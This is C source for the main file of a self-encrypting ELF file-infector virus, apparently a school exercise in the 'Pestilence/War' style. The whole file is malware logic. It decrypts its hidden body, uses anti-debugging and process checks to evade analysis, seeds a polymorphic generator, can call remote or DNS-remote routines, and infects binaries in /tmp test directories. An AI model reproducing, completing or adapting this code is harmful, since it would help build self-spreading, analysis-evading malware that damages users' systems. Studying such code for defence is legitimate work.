#include <elf.h>
#include "infect.h"
#include "ft_lib.h"
#include "hacks.h"
#include "pos.h"
#include "table.h"

extern char   environ[8];

int main(void) asm ("entry");

__start2 void DECRYPT_ROUTINE(char *s, uint64_t n, uint64_t k[2]){
		//}
		//__start void ENCRYPT_ROUTINE(char *s, uint64_t n, uint64_t k[2]){
asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");
asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");
asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");
asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");
asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");
asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");
asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");
asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");
asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");
asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");
asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");
asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");
asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");asm volatile("nop");
}
extern char _infect_push;
extern char _infect_pop;


extern char data;
extern char dataearly;
extern struct s_opt opt;
extern uint64_t iscompressed;
extern char test_area;
extern char   key[16];
extern uint64_t seed;
extern uint64_t fingerprint;
extern unsigned int num_to_xor;

//======================== WAR ===============================

uint32_t ft_rand(){
		seed = ((uint64_t)seed * 48271u) % 0x7fffffff;
		return seed;
}

uint32_t ft_true_rand(){
	uint32_t	rval = 0;
	int		fd;

	if ((fd = ft_open("/dev/urandom", 0, 0)) != -1)
	{
		ft_read(fd, &rval, 4);
		ft_close(fd);
	}
	return rval;
}

void ft_srand(){
		seed = fingerprint;
		if (!opt.do_no_random)
			seed ^= ft_true_rand();
}

void print_stats(){
	int x = (size_t)(&cmpr_start) - (size_t)(&bin_start);
	debug_ext("zone 1:", 0," to ", x-1, " (start, encrypt routine, ...)\n");
	int x2 = (size_t)(&crypt_start) - (size_t)(&bin_start);
	debug_ext("zone 2:", x," to ", x2-1, " (compression routine, ...)\n");
	int x3 = (size_t)(&crypt_end) - (size_t)(&bin_start);
	debug_ext("zone 3:", x2," to ", x3-1, " (virus, infection routine, ...)\n");
}

//======================= PESTILENCE =========================

int __start decryptHiddenCode(){
		uint32_t *k = (uint32_t *)key;
		//-- decrypt z3        ------
		uint64_t n = ((size_t)&crypt_end) - ((size_t)&crypt_start);
		char *s = ((char*)&crypt_start);
		if (decrypt(s,n,k, iscompressed, &DECRYPT_ROUTINE) == -1)
				return FALSE;

		for (int i = 0; i < 15; i++)
				if ((&test_area)[i] != 'A')
						return FALSE;
		return TRUE;
}

//=============================================================

void do_infection(){
		char *virus = (char *)&bin_start;
		size_t virus_len = ((size_t)&bin_end) - ((size_t)&bin_start);

		size_t cmpr_off = ((size_t)&cmpr_start) - ((size_t)&bin_start);
		size_t cmpr_len = ((size_t)&cmpr_end) - ((size_t)&cmpr_start);

		size_t crypt_off = ((size_t)&crypt_start) - ((size_t)&bin_start);
		size_t crypt_len = ((size_t)&crypt_end) - ((size_t)&crypt_start);

		size_t decrypt_routine_off = ((size_t)&DECRYPT_ROUTINE) - ((size_t)&bin_start);
		size_t data_off = ((size_t)&data) - ((size_t)&bin_start);
		size_t dataearly_off = ((size_t)&dataearly) - ((size_t)&bin_start);

		size_t infectpush_off = ((size_t)&_infect_push) - ((size_t)&bin_start);
		size_t infectpop_off = ((size_t)&_infect_pop) - ((size_t)&bin_start);

		size_t gbt_off, gbtlen_off, modift_off, modiftlen_off;
		gbt_off = ((size_t)&garbage_table) - ((size_t)&bin_start);
		gbtlen_off = ((size_t)&garbage_table_len) - ((size_t)&bin_start);
		modift_off = ((size_t)&modified_table) - ((size_t)&bin_start);
		modiftlen_off = ((size_t)&modified_table_len) - ((size_t)&bin_start);

		size_t num_to_xor_off = ((size_t)&num_to_xor) - ((size_t)&bin_start);
		
		InfectParams x = (InfectParams){virus, virus_len, cmpr_off, cmpr_len,
			crypt_off, crypt_len, decrypt_routine_off,
			&DECRYPT_ROUTINE,data_off,dataearly_off,infectpush_off,infectpop_off,
			gbt_off, gbtlen_off, modift_off, modiftlen_off,
		num_to_xor_off};

		infect_dir("/tmp/test", x, opt);
		infect_dir("/tmp/test2", x, opt);
}

int virus(void){
		ft_srand();
		debug("** Virus");
		if (opt.do_remote) remote();
		if (opt.do_dns_remote)
				dns_remote();
		if (opt.print_msg) println("[I am a bad virus]");

		print_stats();
		do_infection();
		debug("** End of Virus");
		return TRUE;
}

__start void print_debugging(){
		char s[14];
		s[ 0] = 'D';
		s[ 1] = 'E';
		s[ 2] = 'B';
		s[ 3] = 'U';
		s[ 4] = 'G';
		s[ 5] = 'G';
		s[ 6] = 'I';
		s[ 7] = 'N';
		s[ 8] = 'G';
		s[ 9] = '.';
		s[10] = '.';
		s[11] = '.';
		s[12] = '\n';
		s[13] = '\0';
		CALL(SYS_write, 1, s, 13);
}


__start int main(void){
		char cmp[5];
		cmp[0] = 't';
		cmp[1] = 'e';
		cmp[2] = 's';
		cmp[3] = 't';
		cmp[4] = '\0';
		if (checkproc(cmp) == FALSE){
				return FALSE;
		}
		//((unsigned char *)key)[0] ^= 0b01110010;
		if (checkdebug() == 0)
			return decryptHiddenCode() && virus();
		else
				print_debugging();
		return (0);
}
